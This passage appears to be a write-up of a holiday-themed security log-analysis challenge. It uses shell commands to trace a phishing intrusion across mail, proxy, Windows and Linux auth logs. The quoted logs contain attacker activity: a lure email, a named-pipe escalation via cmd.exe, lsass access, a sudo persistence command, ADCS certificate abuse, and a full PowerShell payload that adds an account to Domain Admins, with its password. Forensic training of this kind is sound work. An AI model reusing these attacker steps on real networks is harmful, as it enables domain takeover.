email text?</p> <pre><code>cat mail.log | head -n1\n\n&lt;134&gt;1 2024-09-15T08:26:14-04:00 SecureElfGwy SnowGlowMailPxy - - - {\"From\": \"elf_user00@northpole.local\", \"To\": \"asnowball04@northpole.local\", \"Subject\": \"Welcome to the North Pole!\", \"Date\": null, \"Message-ID\": \"&lt;532A9346-9F5F-4C29-BD40-CA171DD0E7DE@SecureElfGwy.northpole.local&gt;\", \"Return-Path\": \"elf_user00@northpole.local\", \"Body\": \"Dear asnowball04,\\n\\nI wanted to inform you that we have a new team member joining us, [New Hire]. They will be joining our department as [Job Title]. Please extend a warm welcome and assist them with any necessary introductions and onboarding processes.\\n\\nLooking forward to working together!\\n\\nBest regards,\\nelf_user00\\n\", \"Received_Time\": \"2024-09-15T08:26:14-04:00\", \"ReceivedIP1\": \"172.24.25.25\", \"ReceivedIP2\": \"172.24.25.20\"}\n</code></pre> <p>Answer: <code>Body</code></p> Solution to question 8 <p>Question</p> <p>Using the 'GreenCoat' event_source, what is the only value in the hostname field?</p> <pre><code>cat greencoat.log | head -n1\n\n&lt;134&gt;1 2024-09-15T05:57:55-04:00 SecureElfGwy GreenCoat - - - {\"ip\": \"172.24.25.93\", \"user_identifier\": \"elf_user03\", \"timestamp\": \"2024-09-15T05:57:55-04:00\", \"method\": \"CONNECT\", \"url\": \"disc601.prod.do.dsp.mp.microsoft.com:443\", \"http_protocol\": \"HTTP/1.1\", \"status_code\": 200, \"response_size\": 0, \"protocol\": \"HTTPS\", \"additional_info\": \"outgoing via 172.24.25.25\", \"host\": \"SnowSentry\"}\n</code></pre> <p>Answer: <code>SecureElfGwy</code></p> Solution to question 9 <p>Question</p> <p>Using the 'GreenCoat' event_source, what is the name of the field that contains the site visited by a client in the network?</p> <pre><code>cat greencoat.log | head -n1\n&lt;134&gt;1 2024-09-15T05:57:55-04:00 SecureElfGwy GreenCoat - - - {\"ip\": \"172.24.25.93\", \"user_identifier\": \"elf_user03\", \"timestamp\": \"2024-09-15T05:57:55-04:00\", \"method\": \"CONNECT\", \"url\": \"disc601.prod.do.dsp.mp.microsoft.com:443\", \"http_protocol\": \"HTTP/1.1\", \"status_code\": 200, \"response_size\": 0, \"protocol\": \"HTTPS\", \"additional_info\": \"outgoing via 172.24.25.25\", \"host\": \"SnowSentry\"}\n</code></pre> <p>Answer: <code>url</code></p> Solution to question 10 <p>Question</p> <p>Using the 'GreenCoat' event_source, which unique URL and port (URL:port) did clients in the TinselStream network visit most?</p> <pre><code>cat greencoat.log | cut -d '\"' -f 20 | sort | uniq -c | sort -n | tail -n 1\n\n150 pagead2.googlesyndication.com:443\n</code></pre> <p>Answer: <code>pagead2.googlesyndication.com:443</code></p> Solution to question 11 <p>Question</p> <p>Using the 'WindowsEvent' event_source, how many unique Channels is the SIEM receiving Windows event logs from?</p> AI usage: awk command <p>ChatGPT was used to generate an AWK command.</p> <pre><code>awk -F'\"' '{for (i=1; i&lt;=NF; i++) if ($i == \"Channel\") print $(i+2)}' windows.log | sort | uniq | wc -l\n\n5\n</code></pre> <p>Answer: <code>5</code></p> Solution to question 12 <p>Question</p> <p>What is the name of the event.Channel (or Channel) with the second highest number of events?</p> <pre><code>awk -F'\"' '{for (i=1; i&lt;=NF; i++) if ($i == \"Channel\") print $(i+2)}' windows.log | sort | uniq -c | sort -n\n\n50 Windows PowerShell\n191 System\n11751 Microsoft-Windows-PowerShell/Operational\n17713 Microsoft-Windows-Sysmon/Operational\n2268402 Security\n</code></pre> <p>Answer: <code>Microsoft-Windows-Sysmon/Operational</code></p> Solution to question 13 <p>Question</p> <p>Our environment is using Sysmon to track many different events on Windows systems. What is the Sysmon Event ID related to loading of a driver?</p> <p>Microsoft documentation</p> <p>Answer: <code>6</code></p> Solution to question 14 <p>Question</p> <p>What is the Windows event ID that is recorded when a new service is installed on a system?</p> <p>Microsoft documentation</p> <p>Answer: <code>4697</code></p> Solution to question 15 <p>Question</p> <p>Using the WindowsEvent event_source as your initial filter, how many user accounts were created?</p> <pre><code>cat windows.log | grep 'EventID\": 4720'\n</code></pre> <p>Answer: <code>0</code></p> Solution to question 1 <p>Question</p> <p>What is the event.EventID number for Sysmon event logs relating to process creation?</p> <p>Microsoft documentation</p> <p>Answer: <code>1</code></p> Solution to question 2 <p>Question</p> <p>How many unique values are there for the 'event_source' field in all of the logs?</p> <p>Answer: <code>5</code> (from question 1 of the silver achievement)</p> Solution to question 3 <p>Question</p> <p>What is the event_source name that contains the email logs?</p> <p>Answer: <code>SnowGlowMailPxy</code> (from question 6 of the silver achievement)</p> Solution to question 4 <p>Question</p> <p>The North Pole network was compromised recently through a sophisticated phishing attack sent to one of our elves. The attacker found a way to bypass the middleware that prevented phishing emails from getting to North Pole elves. As a result, one of the Received IPs will likely be different from what most email logs contain. Find the email log in question and submit the value in the event 'From:' field for this email log event.</p> <pre><code>cat mail.log | cut -d '\"' -f 38 | sort | uniq\n\n172.24.25.20\n172.24.25.25\n34.30.110.62\nReceivedIP1\nReceivedIP2\n\ncat mail.log | grep \"34.30.110.62\"\n\n&lt;134&gt;1 2024-09-15T10:36:09-04:00 SecureElfGwy SnowGlowMailPxy - - - {\"From\": \"kriskring1e@northpole.local\", \"To\": \"elf_user02@northpole.local\", \"Subject\": \"URGENT!\", \"Date\": null, \"Message-ID\": \"&lt;F3483D7F-3DBF-4A92-813D-4D9738479E50@SecureElfGwy.northpole.local&gt;\", \"Return-Path\": \"fr0sen@hollyhaven.snowflake\", \"Body\": \"We need to store the updated naughty and nice list somewhere secure. I posted it here http://hollyhaven.snowflake/howtosavexmas.zip. Act quickly so I can remove the link from the internet! I encrypted it with the password: n&amp;nli$t_finAl1\\n\\nthx!\\nkris\\n- Sent from the sleigh. Please excuse any Ho Ho Ho's.\", \"Received_Time\": \"2024-09-15T10:36:09-04:00\", \"ReceivedIP1\": \"172.24.25.25\", \"ReceivedIP2\": \"34.30.110.62\"}\n</code></pre> <p>Answer: <code>kriskring1e@northpole.local</code></p> Solution to question 5 <p>Question</p> <p>Our ElfSOC analysts need your help identifying the hostname of the domain computer that established a connection to the attacker after receiving the phishing email from the previous question. You can take a look at our GreenCoat proxy logs as an event source. Since it is a domain computer, we only need the hostname, not the fully qualified domain name (FQDN) of the system.</p> <pre><code>cat greencoat.log | grep \"hollyhaven\"\n\n&lt;134&gt;1 2024-09-15T10:36:26-04:00 SecureElfGwy GreenCoat - - - {\"ip\": \"172.24.25.12\", \"user_identifier\": \"elf_user02\", \"timestamp\": \"2024-09-15T10:36:26-04:00\", \"method\": \"GET\", \"url\": \"http://hollyhaven.snowflake/howtosavexmas.zip\", \"http_protocol\": \"HTTP/1.1\", \"status_code\": 200, \"response_size\": 1098, \"protocol\": \"HTTP\", \"additional_info\": \"outgoing via 172.24.25.25\", \"host\": \"SleighRider\"}\n</code></pre> <p>Answer: <code>SleighRider</code></p> Solution to question 6 <p>Question</p> <p>What was the IP address of the system you found in the previous question?</p> <p>Answer: <code>172.24.25.12</code></p> Solution to question 7 <p>Question</p> <p>A process was launched when the user executed the program AFTER they downloaded it. What was that Process ID number (digits only please)?</p> <pre><code>cat *.log | grep \"howtosavexmas\"\n\nLook for first log not with .zip\n\n&lt;134&gt;1 2024-09-15T10:37:09-04:00 SleighRider.northpole.local WindowsEvent - - - {\"EventTime\": \"2024-09-15 10:37:09\", \"Hostname\": \"SleighRider.northpole.local\", \"Keywords\": -9223372036854775808, \"EventType\": \"INFO\", \"SeverityValue\": 2, \"Severity\": \"INFO\", \"EventID\": 11, \"SourceName\": \"Microsoft-Windows-Sysmon\", \"ProviderGuid\": \"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}\", \"Version\": 2, \"Task\": 11, \"OpcodeValue\": 0, \"RecordNumber\": 714, \"ProcessID\": 10014, \"ThreadID\": 6340, \"Channel\": \"Microsoft-Windows-Sysmon/Operational\", \"Domain\": \"NT AUTHORITY\", \"AccountName\": \"SYSTEM\", \"UserID\": \"S-1-5-18\", \"AccountType\": \"User\", \"Category\": \"File created (rule: FileCreate)\", \"Opcode\": \"Info\", \"RuleName\": \"Downloads\", \"UtcTime\": \"2024-09-15T10:37:09-04:00\", \"ProcessGuid\": \"{face0b26-e149-6606-9300-000000000700}\", \"Image\": \"C:\\\\Windows\\\\Explorer.EXE\", \"TargetFilename\": \"C:\\\\Users\\\\elf_user02\\\\Downloads\\\\howtosavexmas\\\\howtosavexmas.pdf.exe\", \"CreationUtcTime\": \"2024-09-15T10:37:09-04:00\", \"User\": \"NORTHPOLE\\\\elf_user02\", \"EventReceivedTime\": \"2024-09-15T10:37:09-04:00\", \"SourceModuleName\": \"inSysmon\", \"SourceModuleType\": \"im_msvistalog\", \"ProcessId\": 5680, \"MoreDetails\": \"File created:\"}\n</code></pre> <p>Answer: <code>10014</code></p> Solution to question 8 <p>Question</p> <p>Did the attacker's payload make an outbound network connection? Our ElfSOC analysts need your help identifying the destination TCP port of this connection.</p> <pre><code>cat windows.log | grep \"howtosavexmas.pdf.exe\" | grep \"connection\"\n\n&lt;134&gt;1 2024-09-15T10:37:50-04:00 SleighRider.northpole.local WindowsEvent - - - {\"EventTime\": \"2024-09-15 10:37:50\", \"Hostname\": \"SleighRider.northpole.local\", \"Keywords\": -9214364837600034816, \"EventType\": \"AUDIT_SUCCESS\", \"SeverityValue\": 2, \"Severity\": \"INFO\", \"EventID\": 5156, \"SourceName\": \"Microsoft-Windows-Security-Auditing\", \"ProviderGuid\": \"{54849625-5478-4994-A5BA-3E3B0328C30D}\", \"Version\": 1, \"Task\": 12810, \"OpcodeValue\": 0, \"RecordNumber\": 734596, \"ProcessID\": 4, \"ThreadID\": 1460, \"Channel\": \"Security\", \"Category\": \"Filtering Platform Connection\", \"Opcode\": \"Info\", \"Application\": \"\\\\device\\\\harddiskvolume3\\\\users\\\\elf_user02\\\\downloads\\\\howtosavexmas\\\\howtosavexmas.pdf.exe\", \"Direction\": \"%%14593\", \"SourceAddress\": \"172.24.25.12\", \"SourcePort\": 64543, \"DestAddress\": \"103.12.187.43\", \"DestPort\": 8080, \"Protocol\": 6, \"FilterRTID\": 0, \"LayerName\": \"%%14611\", \"LayerRTID\": 48, \"RemoteUserID\": \"S-1-0-0\", \"RemoteMachineID\": \"S-1-0-0\", \"EventReceivedTime\": \"2024-09-15T10:37:50-04:00\", \"SourceModuleName\": \"inSecurityEvent\", \"SourceModuleType\": \"im_msvistalog\", \"ApplicationInformation_ProcessID\": 8096, \"ApplicationInformation_ApplicationName\": \"\\\\device\\\\harddiskvolume3\\\\users\\\\elf_user02\\\\downloads\\\\howtosavexmas\\\\howtosavexmas.pdf.exe\", \"NetworkInformation_Direction\": \"Outbound\", \"NetworkInformation_SourceAddress\": \"172.24.25.12\", \"NetworkInformation_SourcePort\": 64543, \"NetworkInformation_DestinationAddress\": \"103.12.187.43\", \"NetworkInformation_DestinationPort\": 8443, \"NetworkInformation_Protocol\": 6, \"FilterInformation_FilterRunTimeID\": 0, \"FilterInformation_LayerName\": \"Connect\", \"FilterInformation_LayerRunTimeID\": 48, \"MoreDetails\": \"The Windows Filtering Platform has permitted a connection.\"}\n</code></pre> <p>Answer: <code>8443</code></p> Solution to question 9 <p>Question</p> <p>The attacker escalated their privileges to the SYSTEM account by creating an inter-process communication (IPC) channel. Submit the alpha-numeric name for the IPC channel used by the attacker.</p> <pre><code>cat windows.log | grep \"sleighrider\" -i | grep \"cmd.exe\" -i\n&lt;134&gt;1 2024-09-15T10:38:22-04:00 SleighRider.northpole.local WindowsEvent - - - {\"EventTime\": \"2024-09-15 10:38:22\", \"Hostname\": \"SleighRider.northpole.local\", \"Keywords\": -9187343239835811840, \"EventType\": \"INFO\", \"SeverityValue\": 2, \"Severity\": \"INFO\", \"EventID\": 7045, \"SourceName\": \"Service Control Manager\", \"ProviderGuid\": \"{555908D1-A6D7-4695-8E1E-26931D2012F4}\", \"Version\": 0, \"Task\": 0, \"OpcodeValue\": 0, \"RecordNumber\": 1571, \"ProcessID\": 628, \"ThreadID\": 5852, \"Channel\": \"System\", \"Domain\": \"NORTHPOLE\", \"AccountName\": \"elf_user02\", \"UserID\": \"S-1-5-21-3699322559-1991583901-1175093138-1110\", \"AccountType\": \"User\", \"ServiceName\": \"ddpvccdbr\", \"ImagePath\": \"cmd.exe /c echo ddpvccdbr &gt; \\\\\\\\.\\\\pipe\\\\ddpvccdbr\", \"ServiceType\": \"user mode service\", \"StartType\": \"demand start\", \"EventReceivedTime\": \"2024-09-15T10:38:22-04:00\", \"SourceModuleName\": \"inSystemEvent\", \"SourceModuleType\": \"im_msvistalog\", \"ServiceFileName\": \"cmd.exe /c echo ddpvccdbr &gt; \\\\\\\\.\\\\pipe\\\\ddpvccdbr\", \"ServiceStartType\": \"demand start\", \"ServiceAccount\": \"LocalSystem\", \"MoreDetails\": \"A service was installed in the system.\"}\n</code></pre> <p>Answer: <code>ddpvccdbr</code></p> Solution to question 10 <p>Question</p> <p>The attacker's process attempted to access a file. Submit the full and complete file path accessed by the attacker's process.</p> <pre><code>cat windows.log | grep \"sleighrider\" -i | grep \"howtosavexmas.pdf.exe\" | grep 'EventID\": 4663'\n\n&lt;134&gt;1 2024-09-15T10:38:28-04:00 SleighRider.northpole.local WindowsEvent - - - {\"EventTime\": \"2024-09-15 10:38:28\", \"Hostname\": \"SleighRider.northpole.local\", \"Keywords\": -9214364837600034816, \"EventType\": \"AUDIT_SUCCESS\", \"SeverityValue\": 2, \"Severity\": \"INFO\", \"EventID\": 4663, \"SourceName\": \"Microsoft-Windows-Security-Auditing\", \"ProviderGuid\": \"{54849625-5478-4994-A5BA-3E3B0328C30D}\", \"Version\": 1, \"Task\": 12802, \"OpcodeValue\": 0, \"RecordNumber\": 736288, \"ProcessID\": 4, \"ThreadID\": 4864, \"Channel\": \"Security\", \"Category\": \"Kernel Object\", \"Opcode\": \"Info\", \"SubjectUserSid\": \"S-1-5-18\", \"SubjectUserName\": \"SLEIGHRIDER$\", \"SubjectDomainName\": \"NORTHPOLE\", \"SubjectLogonId\": \"0x3e7\", \"ObjectServer\": \"Security\", \"ObjectType\": \"Process\", \"ObjectName\": \"\\\\Device\\\\HarddiskVolume3\\\\Windows\\\\System32\\\\lsass.exe\", \"HandleId\": \"0x2e8\", \"AccessList\": \"%%4484\\r\\n\\t\\t\\t\\t\", \"AccessMask\": \"0x10\", \"ProcessName\": \"C:\\\\Users\\\\elf_user02\\\\Downloads\\\\howtosavexmas\\\\howtosavexmas.pdf.exe\", \"ResourceAttributes\": \"-\", \"EventReceivedTime\": \"2024-09-15T10:38:28-04:00\", \"SourceModuleName\": \"inSecurityEvent\", \"SourceModuleType\": \"im_msvistalog\", \"Subject_SecurityID\": \"S-1-5-18\", \"Subject_AccountName\": \"SLEIGHRIDER$\", \"Subject_AccountDomain\": \"NORTHPOLE\", \"Subject_LogonID\": \"0x3E7\", \"Object_ObjectServer\": \"Security\", \"Object_ObjectType\": \"Process\", \"Object_ObjectName\": \"\\\\Device\\\\HarddiskVolume3\\\\Windows\\\\System32\\\\lsass.exe\", \"Object_HandleID\": \"0x2e8\", \"Object_ResourceAttributes\": \"-\", \"ProcessInformation_ProcessID\": \"0x1fa0\", \"ProcessInformation_ProcessName\": \"C:\\\\Users\\\\elf_user02\\\\Downloads\\\\howtosavexmas\\\\howtosavexmas.pdf.exe\", \"AccessRequestInformation_Accesses\": \"Read from process memory\", \"AccessRequestInformation\": \",\", \"AccessRequestInformation_AccessMask\": \"0x10\", \"MoreDetails\": \"An attempt was made to access an object.\"}\n\n&lt;134&gt;1 2024-09-16T10:45:48-04:00 SleighRider.northpole.local WindowsEvent - - - {\"EventTime\": \"2024-09-16 10:45:48\", \"Hostname\": \"SleighRider.northpole.local\", \"Keywords\": -9223372036854775808, \"EventType\": \"AUDIT_SUCCESS\", \"SeverityValue\": 4, \"Severity\": \"INFO\", \"EventID\": 4663, \"SourceName\": \"Microsoft-Windows-Security-Auditing\", \"ProviderGuid\": \"{54849625-5478-4994-A5BA-3E3B0328C30D}\", \"Version\": 1, \"Task\": 12800, \"OpcodeValue\": 0, \"RecordNumber\": 123456, \"ProcessID\": 10014, \"ThreadID\": 6340, \"Channel\": \"Security\", \"Domain\": \"NT AUTHORITY\", \"AccountName\": \"SYSTEM\", \"UserID\": \"S-1-5-18\", \"AccountType\": \"User\", \"Category\": \"Object Access\", \"Opcode\": \"Info\", \"UtcTime\": \"2024-09-16T10:45:48-04:00\", \"ProcessGuid\": \"{face0b26-426e-660c-eb0f-000000000700}\", \"ProcessName\": \"C:\\\\Users\\\\elf_user02\\\\Downloads\\\\howtosavexmas\\\\howtosavexmas.pdf.exe\", \"ObjectServer\": \"Security\", \"ObjectType\": \"File\", \"ObjectName\": \"C:\\\\Users\\\\elf_user02\\\\Desktop\\\\kkringl315@10.12.25.24.pem\", \"HandleID\": \"0x3fc\", \"Accesses\": \"READ_CONTROL,SYNCHRONIZE,ReadData\", \"AccessMask\": \"0x120089\", \"EventReceivedTime\": \"2024-09-16T10:45:48-04:00\", \"SourceModuleName\": \"inSecurity\", \"SourceModuleType\": \"im_msvistalog\"}\n</code></pre> <p>Answer: <code>C:\\Users\\elf_user02\\Desktop\\kkringl315@10.12.25.24.pem</code> (removed double slashes)</p> Solution to question 11 <p>Question</p> <p>The attacker attempted to use a secure protocol to connect to a remote system. What is the hostname of the target server?</p> <pre><code>cat *.log | grep \"2024-09-16\" | grep \"10.12.25.24\"\n\n&lt;134&gt;1 2024-09-16T11:03:06-04:00 kringleSSleigH AuthLog - - - {\"timestamp\": \"2024-09-16T14:03:06.315201-04:00\", \"hostname\": \"kringleSSleigH\", \"service\": \"sshd[6301]:\", \"message\": \"Connection from 34.30.110.62 port 58634 on 10.12.25.24 port 802 rdomain \\\"\\\"\"}\n</code></pre> <p>Answer: <code>kringleSSleigH</code></p> Solution to question 12 <p>Question</p> <p>The attacker created an account to establish their persistence on the Linux host. What is the name of the new account created by the attacker?</p> <pre><code>cat auth.log | cut -d '\"' -f 16 | sort | uniq\n\nAccepted key RSA SHA256:AbfXsQOO05qHNT98Rhe1B7KzURo0viFfq2/gpAWlP7E found at /home/kkringl315/.ssh/authorized_keys:1\nAccepted publickey for kkringl315 from 34.30.110.62 port 41606 ssh2: RSA SHA256:AbfXsQOO05qHNT98Rhe1B7KzURo0viFfq2/gpAWlP7E\nAccepted publickey for kkringl315 from 34.30.110.62 port 48202 ssh2: RSA SHA256:AbfXsQOO05qHNT98Rhe1B7KzURo0viFfq2/gpAWlP7E\nAccepted publickey for kkringl315 from 34.30.110.62 port 58634 ssh2: RSA SHA256:AbfXsQOO05qHNT98Rhe1B7KzURo0viFfq2/gpAWlP7E\nadd 'ssdh' to group 'sudo'\nadd 'ssdh' to shadow group 'sudo'\nchanged user 'ssdh' information\n</code></pre> <p>Answer: <code>ssdh</code></p> Solution to question 13 <p>Question</p> <p>The attacker wanted to maintain persistence on the Linux host they gained access to and executed multiple binaries to achieve their goal. What was the full CLI syntax of the binary the attacker executed after they created the new user account?</p> <pre><code>cat auth.log | grep \"ssdh\"\n\n...\n&lt;134&gt;1 2024-09-16T11:00:14-04:00 kringleSSleigH AuthLog - - - {\"timestamp\": \"2024-09-16T14:00:14.317262-04:00\", \"hostname\": \"kringleSSleigH\", \"service\": \"sudo:\", \"message\": \" kkringl315 : TTY=pts/5 ; PWD=/opt ; USER=root ; COMMAND=/usr/sbin/usermod -a -G sudo ssdh\"}\n...\n</code></pre> <p>Answer: <code>/usr/sbin/usermod -a -G sudo ssdh</code></p> Solution to question 14 <p>Question</p> <p>The attacker enumerated Active Directory using a well known tool to map our Active Directory domain over LDAP. Submit the full ISO8601 compliant timestamp when the first request of the data collection attack sequence was initially recorded against the domain controller.</p> <pre><code>cat windows.log | grep \"dc01.northpole.local WindowsEvent\" | grep \"ldap connection\" -i | head -n1\n\n&lt;134&gt;1 2024-09-16T11:10:12-04:00 dc01.northpole.local WindowsEvent - - - {\"LogName\": \"Directory Service\", \"Source\": \"Microsoft-Windows-ActiveDirectory_DomainService\", \"EventID\": 2889, \"Category\": \"LDAP Interface\", \"Level\": \"Information\", \"Keywords\": \"Classic\", \"Description\": \"The following client performed a SASL (Negotiate/Kerberos/NTLM/Digest) LDAP bind without requesting signing (integrity verification), or performed a simple bind over a clear text (non-SSL/TLS-encrypted) LDAP connection.\", \"Computer\": \"dc01.northpole.local\", \"ClientIPaddress\": \"172.24.25.22:18598\", \"ServicePort\": 389, \"ServiceName\": \"dc01.northpole.local\", \"ServiceIpAddress\": \"172.24.25.153\", \"UserID\": \"elf_user@northpole.local\", \"BindType\": \"0 - Simple Bind that does not support signing\", \"Date\": \"2024-09-16T11:10:12-04:00\"}\n</code></pre> <p>Answer: <code>2024-09-16T11:10:12-04:00</code></p> Solution to question 15 <p>Question</p> <p>The attacker attempted to perform an ADCS ESC1 attack, but certificate services denied their certificate request. Submit the name of the software responsible for preventing this initial attack.</p> <pre><code>cat windows.log | grep \"dc01.northpole.local WindowsEvent\" | grep \"certificate\" -i | grep \"denied\" -i\n\n&lt;134&gt;1 2024-09-16T11:14:12-04:00 dc01.northpole.local WindowsEvent - - - {\"LogName\": \"Security\", \"Source\": \"Microsoft-Windows-Security-Auditing\", \"Date\": \"2024-09-16T11:14:12-04:00\", \"EventID\": 4888, \"Category\": \"Certification Services - Certificate Request Denied\", \"Level\": \"Information\", \"Keywords\": \"Audit Failure\", \"User\": \"N/A\", \"Computer\": \"dc01.northpole.local\", \"Description\": \"A certificate request was made for a certificate template, but the request was denied because it did not meet the criteria.\", \"UserInformation_UserName\": \"elf_user@northpole.local\", \"CertificateInformation_CertificateAuthority\": \"elf-dc01-SeaA\", \"CertificateInformation_RequestedTemplate\": \"Administrator\", \"ReasonForRejection\": \"KringleGuard EDR flagged the certificate request.\", \"AdditionalInformation_RequesterComputer\": \"10.12.25.24\", \"AdditionalInformation_RequestedUPN\": \"administrator@northpole.local\"}\n</code></pre> <p>Answer: <code>KringleGuard</code></p> Solution to question 16 <p>Question</p> <p>We think the attacker successfully performed an ADCS ESC1 attack. Can you find the name of the user they successfully requested a certificate on behalf of?</p> <pre><code>cat windows.log | grep \"dc01.northpole.local WindowsEvent\" | grep 'EventID\": 4886'\n\n&lt;134&gt;1 2024-09-16T11:15:12-04:00 dc01.northpole.local WindowsEvent - - - {\"LogName\": \"Security\", \"Source\": \"Microsoft-Windows-Security-Auditing\", \"Date\": \"2024-09-16T11:15:12-04:00\", \"EventID\": 4886, \"Category\": \"Certification Services - Certificate Issuance\", \"Level\": \"Information\", \"Keywords\": \"Audit Success\", \"User\": \"N/A\", \"Computer\": \"dc01.northpole.local\", \"Description\": \"A certificate was issued to a user.\", \"UserInformation_UserName\": \"elf_user@northpole.local\", \"UserInformation_UPN\": \"nutcrakr@northpole.local\", \"CertificateInformation_CertificateAuthority\": \"elf-dc01-SeaA\", \"CertificateInformation_CertificateTemplate\": \"ElfUsers\", \"AdditionalInformation_RequesterComputer\": \"10.12.25.24\", \"AdditionalInformation_CallerComputer\": \"172.24.25.153\"}\n</code></pre> <p>Answer: <code>nutcrakr</code></p> Solution to question 17 <p>Question</p> <p>One of our file shares was accessed by the attacker using the elevated user account (from the ADCS attack). Submit the folder name of the share they accessed.</p> <pre><code>cat windows.log | grep \"dc01.northpole.local WindowsEvent\" | grep 'nutcrakr' | grep \"share\"\n\n&lt;134&gt;1 2024-09-16T11:18:43-04:00 dc01.northpole.local WindowsEvent - - - {\"EventTime\": \"2024-09-16 11:18:43\", \"Hostname\": \"dc01.northpole.local\", \"Keywords\": -9214364837600034816, \"EventType\": \"AUDIT_SUCCESS\", \"SeverityValue\": 2, \"Severity\": \"INFO\", \"EventID\": 5140, \"SourceName\": \"Microsoft-Windows-Security-Auditing\", \"ProviderGuid\": \"{54849625-5478-4994-A5BA-3E3B0328C30D}\", \"Version\": 1, \"Task\": 12808, \"OpcodeValue\": 0, \"RecordNumber\": 498420, \"ProcessID\": 4, \"ThreadID\": 5692, \"Channel\": \"Security\", \"Category\": \"File Share\", \"Opcode\": \"Info\", \"SubjectUserSid\": \"S-1-5-21-3699322559-1991583901-1175093138-1112\", \"SubjectUserName\": \"nutcrakr\", \"SubjectDomainName\": \"NORTHPOLE\", \"SubjectLogonId\": \"0xd8fdb3\", \"ObjectType\": \"File\", \"IpAddress\": \"34.30.110.62\", \"IpPort\": 53378, \"ShareName\": \"\\\\\\\\*\\\\WishLists\", \"ShareLocalPath\": \"\\\\??\\\\C:\\\\WishLists\", \"AccessMask\": \"0x1\", \"AccessList\": \"%%4416\\r\\n\\t\\t\\t\\t\", \"EventReceivedTime\": \"2024-09-16T11:18:43-04:00\", \"SourceModuleName\": \"inSecurityEvent\", \"SourceModuleType\": \"im_msvistalog\", \"Subject_SecurityID\": \"S-1-5-21-3699322559-1991583901-1175093138-1112\", \"Subject_AccountName\": \"nutcrakr\", \"Subject_AccountDomain\": \"NORTHPOLE\", \"Subject_LogonID\": \"0xD8FDB3\", \"NetworkInformation_ObjectType\": \"File\", \"NetworkInformation_SourceAddress\": \"34.30.110.62\", \"NetworkInformation_SourcePort\": 53378, \"NetworkInformation\": \",\", \"ShareInformation_ShareName\": \"\\\\\\\\*\\\\WishLists\", \"ShareInformation_SharePath\": \"\\\\??\\\\C:\\\\WishLists\", \"AccessRequestInformation_AccessMask\": \"0x1\", \"AccessRequestInformation_Accesses\": \"ReadData (or ListDirectory)\", \"AccessRequestInformation\": \",\", \"MoreDetails\": \"A network share object was accessed.\"}\n</code></pre> <p>Answer: <code>WishLists</code></p> Solution to question 18 <p>Question</p> <p>The naughty attacker continued to use their privileged account to execute a PowerShell script to gain domain administrative privileges. What is the password for the account the attacker used in their attack payload?</p> <pre><code>cat windows.log | grep 'Payload' | grep \"nutcrakr\" -i\n\n&lt;134&gt;1 2024-09-16T11:33:12-04:00 SleighRider.northpole.local WindowsEvent - - - {\"ContextInfo\": \" Severity = Informational\\r\\n Host Name = Default Host\\r\\n Host Version = 5.1.19041.1\\r\\n Host ID = 4571e982-1bfd-4d83-97f2-ce85d3e41b9d\\r\\n Host Application = powershell\\r\\n Engine Version = 5.1.19041.1\\r\\n Runspace ID = dd0ca0e4-fdfe-49be-ada7-2931df92cca6\\r\\n Pipeline ID = 1\\r\\n Command Name = Set-StrictMode\\r\\n Command Type = Cmdlet\\r\\n Script Name = \\r\\n Command Path = \\r\\n Sequence Number = 30\\r\\n User = NORTHPOLE\\\\elf_user02\\r\\n Connected User = \\r\\n Shell ID = Microsoft.PowerShell\\r\\n\", \"UserData\": \"\", \"Payload\": \"Add-Type -AssemblyName System.DirectoryServices\\n$ldapConnString = \\\"LDAP://CN=Domain Admins,CN=Users,DC=northpole,DC=local\\\"\\n$username = \\\"nutcrakr\\\"\\n$pswd = 'fR0s3nF1@k3_s'\\n$nullGUID = [guid]'00000000-0000-0000-0000-000000000000'\\n$propGUID = [guid]'00000000-0000-0000-0000-000000000000'\\n$IdentityReference = (New-Object System.Security.Principal.NTAccount(\\\"northpole.local\\\\$username\\\")).Translate([System.Security.Principal.SecurityIdentifier])\\n$inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None\\n$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference, ([System.DirectoryServices.ActiveDirectoryRights] \\\"GenericAll\\\"), ([System.Security.AccessControl.AccessControlType] \\\"Allow\\\"), $propGUID, $inheritanceType, $nullGUID\\n$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString, $username, $pswd\\n$secOptions = $domainDirEntry.get_Options()\\n$secOptions.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl\\n$domainDirEntry.RefreshCache()\\n$domainDirEntry.get_ObjectSecurity().AddAccessRule($ACE)\\n$domainDirEntry.CommitChanges()\\n$domainDirEntry.dispose()\\n$ldapConnString = \\\"LDAP://CN=Domain Admins,CN=Users,DC=northpole,DC=local\\\"\\n$domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString, $username, $pswd\\n$user = New-Object System.Security.Principal.NTAccount(\\\"northpole.local\\\\$username\\\")\\n$sid=$user.Translate([System.Security.Principal.SecurityIdentifier])\\n$b=New-Object byte[] $sid.BinaryLength\\n$sid.GetBinaryForm($b,0)\\n$hexSID=[BitConverter]::ToString($b).Replace('-','')\\n$domainDirEntry.Add(\\\"LDAP://&lt;SID=$hexSID&gt;\\\")\\n$domainDirEntry.CommitChanges()\\n$domainDirEntry.dispose()\", \"Provider_Name\": \"Microsoft-Windows-PowerShell\", \"Provider_Guid\": \"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\", \"EventID\": 4103, \"Version\": 1, \"Level\": 4, \"Task\": 106, \"Opcode\": 20, \"Keywords\": \"0x0\", \"TimeCreated_SystemTime\": \"2024-09-16T11:33:12-04:00\", \"EventRecordID\": 55410, \"Correlation_ActivityID\": \"{17aa0df9-5d3d-46e9-bce0-55b7a5be4b43}\", \"ParentProcessID\": 928, \"ThreadID\": 2859, \"Channel\": \"Microsoft-Windows-PowerShell/Operational\", \"Computer\": \"SleighRider.northpole.local\", \"Security_UserID\": \"S-1-5-21-3699322559-1991583901-1175093138-1110\"}\n</code></pre> <p>Answer: <code>fR0s3nF1@k3_s</code></p> Solution to question 19 <p>Question</p> <p>The attacker then used remote desktop to remotely access one of our domain computers. What is the full ISO8601 compliant UTC EventTime when they established this connection?</p> <pre><code>cat windows.log | grep 'eventid\": 4624' -i | grep 'logontype\": 10' -i\n\n&lt;134&gt;1 2024-09-16T11:35:57-04:00 dc01.northpole.local WindowsEvent - - - {\"EventTime\": \"2024-09-16 11:35:57\", \"Hostname\": \"dc01.northpole.local\", \"Keywords\": -9214364837600034816, \"EventType\": 